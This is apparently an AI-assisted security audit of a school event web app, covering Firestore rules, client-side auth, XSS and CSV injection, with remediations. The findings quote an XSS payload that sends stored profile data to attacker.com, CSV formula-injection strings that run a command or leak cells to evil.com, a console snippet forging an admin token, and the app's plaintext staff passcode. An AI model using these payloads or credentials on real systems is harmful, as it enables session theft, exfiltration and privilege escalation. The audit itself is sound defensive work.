# Security Audit Report: Hanhaga 2027 Main Application

**Target Application:** `apps/main`  
**Audit Date:** November 12, 2026  
**Auditor:** Application Security Team / Security Auditor Agent  
**Scope:** Authentication, Authorization, Firestore Security Rules, Input Validation & Sanitization (XSS, CSV Injection), Environment Variables, and Sensitive Data Exposure.

---

## 1. Executive Summary

A comprehensive security review was conducted on the core web application located under `apps/main`. The audit examined client-side authentication mechanisms, route guards, database access controls (`firestore.rules`), data processing utilities (`csv.ts`, `validation.ts`), and client-bundled configuration assets.

### Key Assessment Findings
The audit identified multiple systemic vulnerabilities, including **6 Critical**, **4 High**, **3 Medium**, and **2 Low** severity findings. 

The most critical concerns are:
1. **Broken Access Control & Ineffective Firestore Rules:** All client users (visitors, students, staff) are granted anonymous Firebase Auth tokens upon page load (`signInAnonymously`). Firestore security rules rely almost solely on `isAuthenticated()`, granting any anonymous visitor full read, write, and delete permissions across all collections, including user profiles, student tracking notes, grades, and system configurations.
2. **Client-Side Authentication Gating & Public Secrets:** Staff passcode validation is performed entirely inside the user's browser, comparing against `VITE_STAFF_PASSCODE` (inlined into production JavaScript by Vite) and a hardcoded SHA-256 hash.
3. **Stored Cross-Site Scripting (XSS):** The Bulletin Board allows rich HTML insertion without HTML sanitization (such as DOMPurify) and renders directly via `dangerouslySetInnerHTML`. Because Firestore rules permit anonymous writes to the bulletin boards collection, an unauthenticated external attacker can inject malicious JavaScript executed by all active staff and student sessions.
4. **CSV Injection & Role Escalation:** CSV export does not sanitize dynamic event/exam column headers, enabling formula injection. Furthermore, CSV import accepts arbitrary `role` values without validation.

---

## 2. Vulnerability Severity Matrix

| Vulnerability ID | Title | Severity | Affected Component / File | Impact |
| :--- | :--- | :--- | :--- | :--- |
| **SEC-CRIT-01** | Client-Side Auth Gating & Zero-Credential Impersonation | **Critical** | `apps/main/src/context/AuthContext.tsx` | Account takeover, Student impersonation |
| **SEC-CRIT-02** | Predictable Token Verification & LocalStorage Privilege Escalation | **Critical** | `apps/main/src/context/AuthContext.tsx`, `apps/main/src/App.tsx` | Permanent DB privilege escalation to Admin |
| **SEC-CRIT-03** | Complete Access Control Bypass via Anonymous Authentication | **Critical** | `apps/main/firestore.rules`, `firestore.rules` | Full database breach by any unauthenticated visitor |
| **SEC-CRIT-04** | Unrestricted Read/Write & Role Modification in User Collection | **Critical** | `apps/main/firestore.rules` | PII leakage, user deletion, admin role hijacking |
| **SEC-CRIT-05** | Stored XSS via Unsanitized Bulletin Board HTML Rendering | **Critical** | `apps/main/src/components/bulletin/BulletinBoardBanner.tsx`, `BulletinEditorModal.tsx` | Persistent script execution in all user sessions |
| **SEC-CRIT-06** | Plaintext Staff Passcode Inlined in Production Vite Bundle | **Critical** | `apps/main/.env`, `apps/main/src/context/AuthContext.tsx` | Trivial bypass of staff authentication |
| **SEC-HIGH-01** | Bootstrap Admin Backdoor via Client Environment Variables | **High** | `apps/main/src/context/AuthContext.tsx` | Hardcoded route to full admin rights |
| **SEC-HIGH-02** | Solely Client-Side Route Protection Without Backend Enforcement | **High** | `apps/main/src/components/ProtectedRoute.tsx` | Unauthorized UI access & administrative feature exposure |
| **SEC-HIGH-03** | Unauthorized Exposure & Modification of Grades, Attendance, and Tracking Notes | **High** | `apps/main/firestore.rules` | Massive PII / student data tampering & privacy violation |
| **SEC-HIGH-04** | Catch-all Firestore Rule & Global System Configuration Overwrite | **High** | `apps/main/firestore.rules` | Denial of Service (Site Closed toggle), DB corruption |
| **SEC-MED-01** | CSV Formula Injection (DDE) in Export Headers | **Medium** | `apps/main/src/utils/csv.ts` | Remote command execution in Excel/Spreadsheet apps |
| **SEC-MED-02** | Unvalidated Role Ingestion During CSV User Import | **Medium** | `apps/main/src/utils/csv.ts` | Mass elevation of privileges via file upload |
| **SEC-MED-03** | Hardcoded Unsalted Passcode Hash in Client Source Code | **Medium** | `apps/main/src/context/AuthContext.tsx` | Offline cracking of static passcode |
| **SEC-LOW-01** | Insufficient Input Sanitization & Unenforced School Whitelist | **Low** | `apps/main/src/utils/validation.ts` | Data integrity anomalies, unsanitized text fields |
| **SEC-LOW-02** | Plaintext Trivia Answers & Station QR Tokens in Frontend Bundle | **Low** | `apps/main/src/views/game/constants/gameConstants.ts` | Trivial cheating in navigation game |

---

## 3. Detailed Vulnerability Analysis

### Category 1: Authentication & Authorization

---

#### [SEC-CRIT-01] Client-Side Auth Gating & Zero-Credential Student/Staff Impersonation
* **Severity:** Critical
* **File:** [apps/main/src/context/AuthContext.tsx](file:///apps/main/src/context/AuthContext.tsx#L268-L315) (Lines 268–315, 423–500)
* **Vulnerability Description:**
  - `loginStudent` does not authenticate the student with Firebase Authentication using any cryptographic secret, password, or verification token. It merely runs `signInAnonymously(auth)` and searches the client-side user list for a record matching the supplied `name` and `phone`. If found, it stores the profile in `localStorage` and marks the session authenticated.
  - Because student phone numbers and names are frequently known to peers, teachers, or exposed via database dump, any third party can assume the identity of any student at will.
  - Furthermore, `loginStaffWithStaticPasscode` (lines 423–500) performs passcode verification entirely in browser JavaScript via `isPasscodeValid(passcode)`. No server-side session token or Firebase Auth Custom Claims are generated or validated.
* **Impact:** Complete lack of non-repudiation and identity verification. Any visitor can impersonate any student or staff member.
* **Remediation:**
  1. Migrate student and staff authentication to Firebase Auth (Phone SMS OTP, Email/Password, or custom token minted via an authenticated Cloud Function).
  2. Deprecate pure client-side credential verification. The server must issue cryptographically signed JWT tokens (or Firebase Custom Claims) containing the verified `role`.

---

#### [SEC-CRIT-02] Predictable Token Verification & LocalStorage Privilege Escalation
* **Severity:** Critical
* **File:** [apps/main/src/context/AuthContext.tsx](file:///apps/main/src/context/AuthContext.tsx#L118-L139), [apps/main/src/App.tsx](file:///apps/main/src/App.tsx#L154-L175)
* **Vulnerability Description:**
  - In `AuthContext.tsx`, `getStaffToken` and `isValidStaffToken` generate a pseudo-token using base64 encoding:
    ```typescript
    // AuthContext.tsx:118-127
    const getStaffToken = (phone: string = '', passcode?: string) => {
        const normPhone = normalizePhone(phone);
        if (!normPhone) return '';
        const secret = passcode?.trim() || (import.meta.env.VITE_STAFF_PASSCODE || '').trim() || AUTHORIZED_PASSCODE_HASH.substring(0, 16);
        try {
            return btoa(`${normPhone}:${secret}`);
        } catch {
            return '';
        }
    };
    ```
  - Both `VITE_STAFF_PASSCODE` and `AUTHORIZED_PASSCODE_HASH` are embedded directly in the frontend build. Any attacker can construct a valid `staffToken` in their browser console:
    ```javascript
    const token = btoa("0500000000:idanaviv100");
    localStorage.setItem('hanhaga_profile', JSON.stringify({
      profile: { id: '0500000000', phone: '0500000000', name: 'Hacker', role: 'admin' },
      expiresAt: Date.now() + 86400000,
      staffToken: token
    }));
    ```
  - When the app is refreshed, `AuthContext` accepts this token. Then in `App.tsx` (lines 154–175):
    ```typescript
    // App.tsx:154-175
    useEffect(() => {
        if (!user || !profile || profile.role !== 'admin' || !profile.phone) return;
        const exists = usersList.some((u) => u.phone === phone || u.id === phone);
        if (!exists) {
            const userRef = doc(db, 'artifacts', appId, 'public', 'data', 'users', phone);
            setDoc(userRef, {
                id: phone, name: adminName, role: 'admin', ...
            }, { merge: true });
        }
    }, [user, profile, usersList]);
    ```
  - Because Firestore allows anonymous writes, the client immediately writes this newly created admin profile to Firestore. The attacker is now permanently registered as an admin in the database!
* **Impact:** Immediate, trivial client-to-backend privilege escalation from unauthenticated visitor to Administrator.
* **Remediation:**
  1. Remove base64 token generation and validation from client code.
  2. Enforce admin role assignment exclusively through Firebase Auth Custom Claims or server-side Cloud Functions using the Firebase Admin SDK.
  3. Delete the auto-persistence hook in `App.tsx:154-175` that writes admin profiles based on unverified client state.

---

#### [SEC-HIGH-01] Bootstrap Admin Backdoor via Client Environment Variables
* **Severity:** High
* **File:** [apps/main/src/context/AuthContext.tsx](file:///apps/main/src/context/AuthContext.tsx#L468-L486)
* **Vulnerability Description:**
  - `loginStaffWithStaticPasscode` contains a fallback mechanism:
    ```typescript
    // AuthContext.tsx:468-472
    const bootstrapName = import.meta.env.VITE_ADMIN_BOOTSTRAP_NAME;
    const bootstrapPhone = normalizePhone(import.meta.env.VITE_ADMIN_BOOTSTRAP_PHONE || '');

    if (!found && bootstrapPhone && normPhone === bootstrapPhone && bootstrapName) {
        if (matchesStaffName(normName, bootstrapName)) {
            const masterAdmin: UserProfile = { ... role: 'admin' };
            ...
    ```
  - If `VITE_ADMIN_BOOTSTRAP_NAME` and `VITE_ADMIN_BOOTSTRAP_PHONE` are set in `.env`, they are inlined into the client bundle. Any visitor who views the source code can observe the bootstrap name and phone number, enter them on the login page with the static passcode (also in the bundle), and receive instantaneous master admin access.
* **Impact:** Predictable administrative backdoor exposed in public assets.
* **Remediation:**
  - Remove all client-side bootstrap administrator logic. Admin bootstrapping must be performed via server CLI scripts (`scripts/seed-admin.mjs` running in an administrative environment) or Google Cloud Console.

---

#### [SEC-HIGH-02] Solely Client-Side Route Protection Without Backend Enforcement
* **Severity:** High
* **File:** [apps/main/src/components/ProtectedRoute.tsx](file:///apps/main/src/components/ProtectedRoute.tsx#L1-L49)
* **Vulnerability Description:**
  - `ProtectedRoute` renders `children` based strictly on `profile.role` from `useAuth()`.
  - While client-side route guards provide good UI UX, they do not prevent direct invocation of backend services. Because all Firestore queries in `App.tsx` and child views execute under the client's anonymous Firebase Auth context, an attacker can open DevTools and call `getDocs(collection(db, 'artifacts', 'hanhaga-2027', 'public', 'data', 'grades'))` directly, bypassing `ProtectedRoute` completely.
* **Impact:** Bypassing frontend navigation barriers exposes internal data and allows direct database manipulation.
* **Remediation:**
  - Implement defense-in-depth: pair UI route guards with rigorous Firestore Security Rules that validate `request.auth.token.role`.

---

### Category 2: Database & Firestore Security Rules

---

#### [SEC-CRIT-03] Complete Access Control Bypass via Anonymous Authentication
* **Severity:** Critical
* **File:** [apps/main/firestore.rules](file:///apps/main/firestore.rules#L5-L23), [firestore.rules](file:///firestore.rules#L5-L23)
* **Vulnerability Description:**
  - Both rule files define:
    ```rules
    function isAuthenticated() {
      return request.auth != null;
    }
    ```
  - In `AuthContext.tsx` lines 195–200, the app calls `signInAnonymously(auth)` on initial load.
  - For Firebase Auth, an anonymous user has a valid `request.auth` object (`request.auth.uid != null`).
  - Consequently, `isAuthenticated()` evaluates to `true` for **any** anonymous web visitor.
  - Notice also that `isStaff(appId)` (lines 9–15) and `isAdmin(appId)` (lines 17–23) are defined in the rule file, **but are never invoked anywhere in any rule statement!**
* **Impact:** The entire database authorization model degrades to "permit anyone with an internet connection".
* **Remediation:**
  1. Require non-anonymous authentication (`request.auth.token.firebase.sign_in_provider != 'anonymous'`).
  2. Implement role-based authorization using Firebase Auth Custom Claims (`request.auth.token.role == 'admin'`).

---

#### [SEC-CRIT-04] Unrestricted Read/Write & Role Modification in User Collection
* **Severity:** Critical
* **File:** [apps/main/firestore.rules](file:///apps/main/firestore.rules#L41-L45)
* **Vulnerability Description:**
  - The rule for user profiles is:
    ```rules
    // User Profiles
    match /artifacts/{appId}/public/data/users/{userId} {
      allow read: if isAuthenticated();
      allow create, update: if isAuthenticated() && (!('role' in request.resource.data) || request.resource.data.role in ['student', 'instructor', 'assistant', 'admin', 'inspector']);
      allow delete: if isAuthenticated();
    }
    ```
  - **Read:** Any anonymous user can query and read every document in the `users` collection, exfiltrating full names, phone numbers, school affiliations, and roles of all students and staff.
  - **Create / Update:** Any anonymous user can write a document with `role: 'admin'`. The rule explicitly permits `admin` as part of the role whitelist for any authenticated request.
  - **Delete:** Any anonymous user can issue `deleteDoc` calls to erase all user records in the system.
* **Impact:** Total loss of confidentiality (mass PII breach), integrity (arbitrary privilege escalation to Admin), and availability (mass user deletion).
* **Remediation:**
  - Restrict `read` to users reading their own profile or authenticated staff.
  - Restrict `create, update, delete` to verified administrators (`isAdmin(appId)`).
  - Strictly forbid clients from modifying their own `role` field.

---

#### [SEC-HIGH-03] Unauthorized Exposure & Modification of Grades, Attendance, and Tracking Notes
* **Severity:** High
* **File:** [apps/main/firestore.rules](file:///apps/main/firestore.rules#L52-L65)
* **Vulnerability Description:**
  ```rules
  // Grades
  match /artifacts/{appId}/public/data/grades/{gradeId} {
    allow read, write: if isAuthenticated();
  }

  // Attendance
  match /artifacts/{appId}/public/data/attendance/{studentId} {
    allow read, write: if isAuthenticated();
  }

  // Internal Staff Notes (student tracking portfolio)
  match /artifacts/{appId}/public/data/notes/{studentId} {
    allow read, write: if isAuthenticated();
  }
  ```
  - Although the client application UI attempts to scope queries (e.g. `where('studentId', '==', profile.id)` in `App.tsx:190`), the Firestore rules permit any anonymous user to read, overwrite, and delete any student's grades, attendance records, and confidential staff tracking notes.
* **Impact:** Severe violation of student privacy laws (Israeli Protection of Privacy Law, 5741-1981 / GDPR); grade tampering; unauthorized tracking record modification.
* **Remediation:**
  - Limit `notes` read/write strictly to `isStaff()`. Students must never be able to read or write staff notes.
  - Limit `grades` and `attendance` writes to staff (`isStaff()`). Allow students to read only their own respective document where `resource.data.studentId == request.auth.uid`.

---

#### [SEC-HIGH-04] Catch-all Firestore Rule & Global System Configuration Overwrite
* **Severity:** High
* **File:** [apps/main/firestore.rules](file:///apps/main/firestore.rules#L35-L38), [L78-L80](file:///apps/main/firestore.rules#L78-L80)
* **Vulnerability Description:**
  ```rules
  // Config & Settings
  match /artifacts/{appId}/public/config {
    allow read: if true;
    allow write: if isAuthenticated();
  }

  // Catch-all for any additional public/data collections under artifacts/{appId}
  match /artifacts/{appId}/public/data/{collection}/{docId} {
    allow read, write: if isAuthenticated();
  }
  ```
  - Anonymous users can modify `public/config`. By updating `{ isSiteClosed: true }`, any malicious actor can lock all legitimate students and staff out of the application (Denial of Service).
  - The catch-all rule completely negates least-privilege principles by enabling full read and write access to any newly introduced collections.
* **Impact:** Denial of Service; broad unauthenticated data pollution.
* **Remediation:**
  - Restrict `config` writes strictly to `isAdmin()`.
  - Remove open catch-all wildcard read/write permissions.

---

### Category 3: Client-Side Input Validation & Sanitization

---

#### [SEC-CRIT-05] Stored Cross-Site Scripting (XSS) via Unsanitized Bulletin Board HTML Rendering
* **Severity:** Critical
* **File:** [apps/main/src/components/bulletin/BulletinBoardBanner.tsx](file:///apps/main/src/components/bulletin/BulletinBoardBanner.tsx#L114-L119), [BulletinEditorModal.tsx](file:///apps/main/src/components/bulletin/BulletinEditorModal.tsx#L273-L289)
* **Vulnerability Description:**
  - In `BulletinBoardBanner.tsx`:
    ```tsx
    // BulletinBoardBanner.tsx:114-119
    {hasHtml && (
        <div
            className="bulletin-content leading-relaxed select-text space-y-2"
            dangerouslySetInnerHTML={{ __html: boardData.htmlContent }}
        />
    )}
    ```
  - In `BulletinEditorModal.tsx`:
    ```typescript
    // BulletinEditorModal.tsx:273-289
    const finalHtml = editorRef.current ? editorRef.current.innerHTML : htmlContent;
    const payload: BulletinBoardData = {
        ...
        htmlContent: finalHtml,
        ...
    };
    await setDoc(docRef, payload, { merge: true });
    ```
  - The HTML is saved directly to Firestore without sanitization, and rendered directly with `dangerouslySetInnerHTML`.
  - Combined with the unauthenticated Firestore rule (`match .../bulletin_boards/{boardId} { allow write: if isAuthenticated(); }`), an attacker does not even need to use the modal UI; they can write a Firestore document directly containing:
    ```html
    <img src=x onerror="fetch('https://attacker.com/steal?data=' + encodeURIComponent(localStorage.getItem('hanhaga_profile')))">
    ```
  - When any user (administrator, instructor, student) loads the app, the payload executes automatically in their browser.
* **Impact:** Persistent XSS across all client sessions; full account takeover; session hijacking; DOM defacement.
* **Remediation:**
  1. Install and use `dompurify` (and its TypeScript types `@types/dompurify`) to sanitize `htmlContent` both before persisting to Firestore and before rendering in `BulletinBoardBanner`:
     ```tsx
     import DOMPurify from 'dompurify';
     <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(boardData.htmlContent) }} />
     ```
  2. Lock down Firestore write access for bulletin boards to verified staff members.

---

#### [SEC-MED-01] CSV Formula Injection (DDE) in Export Headers
* **Severity:** Medium
* **File:** [apps/main/src/utils/csv.ts](file:///apps/main/src/utils/csv.ts#L98-L105)
* **Vulnerability Description:**
  - `exportUsersToCSV` defines `sanitizeCSVField` (lines 79–87) which prefixes formulas starting with `=+\-@\t\r\|` with `'`.
  - However, the CSV column headers bypass this sanitization entirely:
    ```typescript
    // csv.ts:98-105
    const headers = [
        'טלפון',
        'שם',
        'בית ספר',
        'מחלקה/קבוצה',
        ...validEvents.map((ev) => `נוכחות: ${ev.title || ev.id}`),
        ...exams.map((ex) => `מבחן: ${ex.title || ex.id}`),
    ];
    ...
    const csvContent = '\uFEFF' + [headers.join(','), ...rows].join('\n');
    ```
  - If a meeting/event or exam title is created or renamed to `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil.com?leak="&A2, "Click Here")`, the formula is placed directly into the first line of the CSV. When an administrator opens the export in Microsoft Excel or LibreOffice Calc, the spreadsheet executes the command or triggers arbitrary web requests.
  - Additionally, `headers.join(',')` does not quote header values, meaning any event title containing a comma will desynchronize the CSV column alignment.
* **Impact:** Client-side remote command execution or sensitive data exfiltration upon opening exported CSV reports in spreadsheet software.
* **Remediation:**
  - Pass all header strings through `sanitizeCSVField` before joining:
    ```typescript
    const headers = [
        sanitizeCSVField('טלפון'),
        sanitizeCSVField('שם'),
        sanitizeCSVField('בית ספר'),
        sanitizeCSVField('מחלקה/קבוצה'),
        ...validEvents.map((ev) => sanitizeCSVField(`נוכחות: ${ev.title || ev.id}`)),
        ...exams.map((ex) => sanitizeCSVField(`מבחן: ${ex.title || ex.id}`)),
    ];
    ```

---

#### [SEC-MED-02] Unvalidated Role Ingestion During CSV User Import
* **Severity:** Medium
* **File:** [apps/main/src/utils/csv.ts](file:///apps/main/src/utils/csv.ts#L47-L73)
* **Vulnerability Description:**
  - In `parseUsersCSV`:
    ```typescript
    // csv.ts:60
    const role = (roleStr ? roleStr.toLowerCase() : 'student') as UserRole;
    ```
  - The parsed `role` is not verified against a whitelist. If an administrator imports a CSV file provided by an external organizer containing `admin` or arbitrary strings in the role column, those users are imported with administrative privileges.
* **Impact:** Unintended mass privilege elevation via malicious or corrupted CSV upload.
* **Remediation:**
  - Explicitly validate `role` against an allowed list:
    ```typescript
    const allowedRoles: UserRole[] = ['student', 'instructor', 'assistant', 'inspector', 'admin'];
    const cleanRole = (roleStr ? roleStr.toLowerCase().trim() : 'student') as UserRole;
    const finalRole: UserRole = allowedRoles.includes(cleanRole) ? cleanRole : 'student';
    ```

---

#### [SEC-LOW-01] Insufficient Input Sanitization & Unenforced School Whitelist
* **Severity:** Low
* **File:** [apps/main/src/utils/validation.ts](file:///apps/main/src/utils/validation.ts#L10-L52)
* **Vulnerability Description:**
  - `validateUserForm` checks phone and name lengths, but allows arbitrary characters (including HTML tags and scripts) in user names and school names.
  - `SCHOOL_LIST` is imported in `validation.ts:3`, but is never validated against; `data.school` is accepted as long as `typeof data.school === 'string'`.
* **Impact:** Data inconsistency, potential second-order HTML injection if rendered without escaping in future views.
* **Remediation:**
  - Strip HTML and control characters from string inputs; enforce `school` membership against `SCHOOL_LIST` (or allow a specific custom flag).

---

### Category 4: Sensitive Environment Variables & Information Exposure

---

#### [SEC-CRIT-06] Plaintext Staff Passcode Inlined in Production Vite Bundle
* **Severity:** Critical
* **File:** [apps/main/.env](file:///apps/main/.env#L9), [AuthContext.tsx](file:///apps/main/src/context/AuthContext.tsx#L111-L115)
* **Vulnerability Description:**
  - The `.env` file contains:
    ```ini
    VITE_STAFF_PASSCODE=idanaviv100
    ```
  - Vite automatically embeds every variable starting with `VITE_` directly into the client-side JavaScript bundle during build time (`import.meta.env.VITE_STAFF_PASSCODE`).
  - Anyone inspecting the network requests, compiled JavaScript chunks, or source map files can view `idanaviv100`.
  - With this passcode and any staff phone number, anyone can log in as staff.
* **Impact:** Trivial discovery of the shared staff passcode by any visitor or student, granting staff access to anyone.
* **Remediation:**
  1. Remove `VITE_STAFF_PASSCODE` from `.env` immediately.
  2. Secrets must never be prefixed with `VITE_` and must never be distributed to client browsers.
  3. Authenticate staff via Firebase Authentication Phone Auth or server-side passcode verification hosted on a Cloud Function / backend API.

---

#### [SEC-MED-03] Hardcoded Unsalted Passcode Hash in Client Source Code
* **Severity:** Medium
* **File:** [apps/main/src/context/AuthContext.tsx](file:///apps/main/src/context/AuthContext.tsx#L27)
* **Vulnerability Description:**
  - `AuthContext.tsx` contains:
    ```typescript
    const AUTHORIZED_PASSCODE_HASH = '2441b25cc6a2a3d9831706510f8de574dd684da6a26bce45d3c7e896543a4608';
    ```
  - This hash is the exact unsalted SHA-256 digest of `idanaviv100`.
  - Unsalted SHA-256 digests can be cracked using standard rainbow tables or offline dictionary attacks in fractions of a second.
* **Impact:** Reversible secret leading to authentication compromise.
* **Remediation:**
  - Delete `AUTHORIZED_PASSCODE_HASH` and `computeSHA256` from client-side code. Passcode verification must only occur server-side with salted hashing algorithms (e.g. bcrypt, argon2).

---

#### [SEC-LOW-02] Plaintext Trivia Answers & Station QR Tokens in Frontend Bundle
* **Severity:** Low
* **File:** [apps/main/src/views/game/constants/gameConstants.ts](file:///apps/main/src/views/game/constants/gameConstants.ts#L26-L217)
* **Vulnerability Description:**
  - The navigation game station objects define `qrCode: 'HANHAGA_STATION_1'`, `questions`, and `correctIndex: 0` directly inside client static code.
  - Any student can open DevTools or execute `console.log(STATIONS)` to read all QR codes without visiting the physical stations, and copy all correct answers.
* **Impact:** Game integrity compromise and unfair competition.
* **Remediation:**
  - If game integrity is required, store stations and answers in Firestore with write access disabled, or fetch questions on-demand via a backend API that checks station completion and hides answers until submitted.

---

## 4. Hardened Security Rules Proposal

Below is the production-ready replacement for `firestore.rules` and `apps/main/firestore.rules`. It implements strict least privilege, enforces user identity validation, and restricts administrative privileges:

```rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {

    // Helper: Is user authenticated (non-anonymous)
    function isAuthenticated() {
      return request.auth != null && request.auth.token.firebase.sign_in_provider != 'anonymous';
    }

    // Helper: Get user document
    function getUserData(appId, uid) {
      return get(/databases/$(database)/documents/artifacts/$(appId)/public/data/users/$(uid)).data;
    }

    // Helper: Check if user exists in the users collection
    function userDocExists(appId, uid) {
      return exists(/databases/$(database)/documents/artifacts/$(appId)/public/data/users/$(uid));
    }

    // Helper: Is staff member (via custom claim or verified user doc)
    function isStaff(appId) {
      return isAuthenticated() && (
        request.auth.token.role in ['admin', 'instructor', 'assistant', 'inspector'] ||
        (userDocExists(appId, request.auth.uid) &&
         getUserData(appId, request.auth.uid).role in ['admin', 'instructor', 'assistant', 'inspector'])
      );
    }

    // Helper: Is administrator
    function isAdmin(appId) {
      return isAuthenticated() && (
        request.auth.token.role == 'admin' ||
        (userDocExists(appId, request.auth.uid) &&
         getUserData(appId, request.auth.uid).role == 'admin')
      );
    }

    // Helper: Is current user the owner of the document
    function isOwner(userId) {
      return isAuthenticated() && request.auth.uid == userId;
    }

    // System collections: fully locked down
    match /system_api_keys/{docId} {
      allow read, write: if false;
    }
    match /system_idempotency/{docId} {
      allow read, write: if false;
    }

    // Global Configuration: Public read, Admin-only write
    match /artifacts/{appId}/public/config {
      allow read: if true;
      allow write: if isAdmin(appId);
    }

    // User Profiles:
    // - Staff can read all profiles; students can only read their own profile
    // - Only Admins can create or delete users
    // - Users can update select profile fields, but NEVER escalate their own role
    match /artifacts/{appId}/public/data/users/{userId} {
      allow read: if isStaff(appId) || isOwner(userId);
      allow create: if isAdmin(appId);
      allow update: if isAdmin(appId) || (
        isOwner(userId) &&
        !request.resource.data.diff(resource.data).affectedKeys().hasAny(['role', 'id', 'phone'])
      );
      allow delete: if isAdmin(appId);
    }

    // Exams: Visible to authenticated users; write restricted to staff
    match /artifacts/{appId}/public/data/exams/{examId} {
      allow read: if isAuthenticated();
      allow write: if isStaff(appId);
    }

    // Grades:
    // - Staff can read and write all grades
    // - Students can read only their own grades
    match /artifacts/{appId}/public/data/grades/{gradeId} {
      allow read: if isStaff(appId) || (
        isAuthenticated() && resource.data.studentId == request.auth.uid
      );
      allow write: if isStaff(appId);
    }

    // Attendance:
    // - Staff can read and write all attendance records
    // - Students can read only their own attendance document
    match /artifacts/{appId}/public/data/attendance/{studentId} {
      allow read: if isStaff(appId) || isOwner(studentId);
      allow write: if isStaff(appId);
    }

    // Internal Staff Tracking Notes:
    // - Confidential to staff only; strictly inaccessible to students
    match /artifacts/{appId}/public/data/notes/{studentId} {
      allow read, write: if isStaff(appId);
    }

    // Events & Meetings: Publicly readable; staff write only
    match /artifacts/{appId}/public/data/events/{eventId} {
      allow read: if true;
      allow write: if isStaff(appId);
    }

    // Bulletin Boards: Publicly readable; staff write only
    match /artifacts/{appId}/public/data/bulletin_boards/{boardId} {
      allow read: if true;
      allow write: if isStaff(appId);
    }

    // Default deny for all other paths
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

---

## 5. Prioritized Remediation Roadmap

### Phase 1: Immediate Critical Fixes (Within 24 Hours)
1. **Sanitize Bulletin Board Content:**
   - Install `dompurify` and wrap all HTML output in `BulletinBoardBanner.tsx` with `DOMPurify.sanitize(...)`.
2. **Remove Exposed Passcode from Environment:**
   - Remove `VITE_STAFF_PASSCODE` from `.env` and `.env.local`.
   - Invalidate the current passcode (`idanaviv100`).
3. **Deploy Hardened Firestore Security Rules:**
   - Update `firestore.rules` and `apps/main/firestore.rules` to disallow anonymous write access to users, config, grades, notes, and bulletin boards.
4. **Patch CSV Injection in Export & Import:**
   - Sanitize all CSV column headers in `apps/main/src/utils/csv.ts`.
   - Whitelist allowed roles during CSV parsing.

### Phase 2: Architectural Realignment (1–2 Weeks)
1. **Server-Side Authentication Migration:**
   - Replace client-side passcode matching with a Firebase Cloud Function endpoint (`/api/verifyStaffPasscode`) that returns a custom Firebase Auth token with custom claims (`{ role: 'instructor' }`).
   - Deprecate anonymous authentication for privileged actions.
2. **Disable Self-Elevation Hooks:**
   - Remove the auto-persistence effect in `App.tsx:154-175` that allows client-injected admin profiles to write to Firestore.
3. **Secrets Management:**
   - Remove hardcoded fallbacks and bootstrap admin credentials from client-side code.
